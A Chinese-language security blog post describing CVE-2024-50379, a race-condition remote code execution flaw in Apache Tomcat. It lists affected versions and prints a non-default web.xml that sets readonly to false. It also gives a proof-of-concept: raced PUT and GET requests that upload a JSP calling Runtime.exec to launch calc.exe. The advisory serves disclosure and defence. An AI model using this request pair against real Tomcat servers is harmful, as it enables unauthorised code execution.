#  CVE-2024-50379｜Apache Tomcat竞争条件远程代码执行漏洞（POC）   
alicy  信安百科   2024-12-21 10:15  
  
**0x00 前言**  
  
  
Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由于Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。  
  
  
Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。  
  
  
  
**0x01 漏洞描述**  
  
  
由于Tomcat在验证文件路径时存在缺陷，如果readonly参数被设置为false（这是一个非标准配置），并且服务器允许通过PUT方法上传文件，那么攻击者就可以上传含有恶意JSP代码的文件。通过不断地发送请求，攻击者可以利用条件竞争，使得Tomcat解析并执行这些恶意文件，从而实现远程代码执行。  
  
  
  
**0x02 CVE编号**  
  
  
CVE-2024-50379  
  
  
  
**0x03 影响版本**  
  
****```
11.0.0-M1 <= Apache Tomcat < 11.0.2
10.1.0-M1 <= Apache Tomcat < 10.1.34
9.0.0.M1 <= Apache Tomcat < 9.0.98
```  
  
****  
  
**0x04 漏洞详情**  
  
  
利用条件：  
  
在Windows系统下启用PUT请求方式，并将readonly初始化参数设置为非默认值false。  
  
  
web.xml配置：  
  
```
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >
<web-app>
<display-name>Archetype Created Web Application</display-name>
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>

    <!-- 设置 readonly 为 false，允许资源被写入或修改 -->
    <init-param>
      <param-name>readonly</param-name>
      <param-value>false</param-value>
    </init-param>

    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>default</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping>
</web-app>
```  
  
  
并发读取和上传同一文件  
```
PUT /d.Jsp·HTTP/1.1
Content-Type:application/json
Host:

aa<%·Runtime.getRuntime().exec("calc.exe");%>
```  
  
```
GET /d.jsp HTTP/1.1
Content-Type:application/json
Host:
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Whm7t4Je6uqWKMWUspqt0h6pmNnHVdyxjLujibWdiaos4h7brKINibTr0Jag75xHPjBtbsTlibmpVV0fQk8S3pnjsw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x05 参考链接**  
  
  
https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r  
  
  
  
  
推荐阅读：  
  
  
[CVE-2024-37383｜Roundcube Webmail存储型XSS漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485685&idx=1&sn=838e54bc45cab050c38c37137d553fa1&scene=21#wechat_redirect)  
  
  
  
[CVE-2024-9264｜Grafana SQL表达式允许远程代码执行（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485671&idx=2&sn=3c50f92d11faad65195774409be07b3b&scene=21#wechat_redirect)  
  
  
  
[N/A｜Roundcube Webmail存在远程代码执行漏洞（POC）](https://mp.weixin.qq.com/s?__biz=Mzg2ODcxMjYzMA==&mid=2247485474&idx=2&sn=c87807bbe8f26ab6c0e05336ace5d5f4&scene=21#wechat_redirect)  
  
  
  
  
  
Ps：国内外安全热点分享，欢迎大家分享、转载，请保证文章的完整性。文章中出现敏感信息和侵权内容，请联系作者删除信息。信息安全任重道远，感谢您的支持  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6urTIficI8UhQibwpYWx4ic7Bk40AJlXrgx3icofWCbd5cbJFheld132R8exvlHnicn0AUjHLmVok4wV9qA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
！！！  
  
  
**本公众号的文章及工具仅提供学习参考，由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用者本人负责,本公众号及文章作者不为此承担任何责任。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Whm7t4Je6uqQ24S6worK6npevNP8p1uPc9jQeMAib2iaibBnibOzFaIbD0KlvsEtUAmL3xdbJJnWk74Y1KfBcIazzw/640?wx_fmt=png "")  
  
  
